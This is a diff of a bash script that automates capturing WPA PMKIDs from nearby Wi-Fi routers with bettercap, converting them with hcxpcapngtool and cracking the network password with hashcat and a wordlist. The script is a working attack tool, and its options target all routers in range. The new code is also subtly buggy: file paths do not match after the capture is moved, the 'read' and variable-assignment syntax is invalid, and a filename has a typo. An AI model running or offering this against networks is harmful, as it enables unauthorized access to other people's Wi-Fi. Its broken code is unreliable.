@@ -24,7 +24,7 @@ if [[ $(id -u) -ne 0 ]]; then
 fi
 
 mkdir /tmp/wifi_pmkid
-echo "Command:  airmon-ng   -> looking for your connected wifi devices"
+echo " -> looking for your connected wifi devices"
 airmon-ng > /tmp/wifi_pmkid/interfaces.txt
 echo ""
 
@@ -51,30 +51,48 @@ echo "Selected device is ${ifaces[$usrinput]}."
 usriface=${ifaces[$usrinput]}
 echo ""
 
-echo "Command: ip link set $usriface down; iw dev $usriface set type monitor; rfkill unblock all; ip link set $usriface up   -> setting your wifi device to monitoring mode"
+echo " -> setting your wifi device to monitoring mode"
 ip link set $usriface down
 iw dev $usriface set type monitor
 rfkill unblock all
 ip link set $usriface up
 
-echo "Command:  bettercap -iface $usriface -caplet /root/commands.cap   -> starting bettercap for capturing PMKIDs"
+echo " -> starting bettercap for capturing PMKIDs"
 echo "Use wifi.assoc * for capturing PMKIDs on all routers or wifi.assoc MAC for capturing a specific PMKID."
 echo "When finished capturing, quit bettercap to go on..."
-sleep 3
+sleep 5
 bettercap -iface $usriface -caplet /root/commands.cap
 
 echo ""
-echo "Type in the directory to store the *.pmkid file containing the handshake:"
-read -p "Directory:" dirinput
-mkdir $dirinput
+echo "Type in the directory to store the *.pcap file containing the handshake:"
+read -e -p "Directory: " dirinput
+if [[ ! -d $dirinput ]]; then
+	mkdir $dirinput
+fi
 echo ""
 
-echo "Command: hcxpcaptool -z $dirinput/captured_pmkids.pmkid /root/bettercap-wifi-handshakes.pcap   -> converting the PMKID data from pcap to 16800-hashcat format."
-hcxpcaptool -z $dirinput/capruted_pmkids.pmkid /root/bettercap-wifi-handshakes.pcap
-rm /root/bettercap-wifi-handshakes.pcap
-
+mv /root/bettercap-wifi-handshakes.pcap $dirinput
+hcxpcapngtool -o handshake-hash.txt bettercap-wifi-handshakes.pcap
+echo "moved the .pcap file to $dirinput"
+echo "created handshake-hash.txt to crack the hash with hashcat"
 echo ""
-echo "Last thing to do is cracking thr password from capruted_pmkids.pmkid with hashcat by using:"
-echo "hashcat -m16800 -a3 -w3 captured_pmkids.pmkid wordlist.txt"
+echo "Do you want to crack the password with hashcat?"
+echo "0) yes"
+echo "1) no"
+read -n "Choice: " choice
 echo ""
+if [ $choice -gt 1 ] || [ $choice -lt 0 ]; then
+	$choice=1
+fi
+if [ $choice -eq 0 ]; then
+	echo "Location of your wordlist:"
+	read -e -p "Path (full): " wordlistinput
+	hashcat -m22000 $dirinput/handshake-hash.txt $wordlistinput
+	echo ""
+else
+	echo ""
+	echo "Last thing to do is cracking thr password from handshake-hash.txt with hashcat by using:"
+	echo "hashcat -m22000 handshae-hash.txt wordlist.txt"
+	echo ""
+fi
 echo "That's it... xD"
